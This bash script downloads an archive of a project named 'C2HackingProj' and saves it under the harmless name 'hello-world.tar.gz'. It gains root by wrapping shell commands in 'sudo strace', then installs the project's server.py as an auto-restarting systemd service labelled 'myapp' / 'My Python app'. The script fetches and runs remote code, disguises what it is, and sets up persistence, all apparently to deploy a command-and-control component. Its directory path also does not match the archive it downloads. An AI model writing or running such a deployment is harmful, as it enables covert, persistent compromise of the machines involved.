#!/bin/bash

curl -fL -o hello-world.tar.gz \
  https://github.com/francisg22/C2HackingProj/archive/refs/heads/master.tar.gz && tar -xzf hello-world.tar.gz
curl -fL https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
/bin/python2.7 get-pip.py --user --no-setuptools --no-wheel
/bin/python2.7 -m pip --version
python2.7 -m pip install --user 'cryptography==3.3.2'


SCRIPT_DIR=$(CDPATH= cd -P -- "$(dirname -- "$0")" && pwd -P)
APP_DIR="$SCRIPT_DIR/C2HackingProj-main"
sudo strace -o /dev/null /bin/sh -c "
cat > /etc/systemd/system/myapp.service <<EOF
[Unit]
Description=My Python app

[Service]
User=myuser
WorkingDirectory=$APP_DIR
ExecStart=/usr/bin/python2.7 -u "$APP_DIR/server.py"
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
"
sudo strace -o /dev/null /bin/sh -c "systemctl daemon-reload"
sudo strace -o /dev/null /bin/sh -c "systemctl enable myapp.service"
sudo strace -o /dev/null /bin/sh -c "systemctl restart myapp.service"


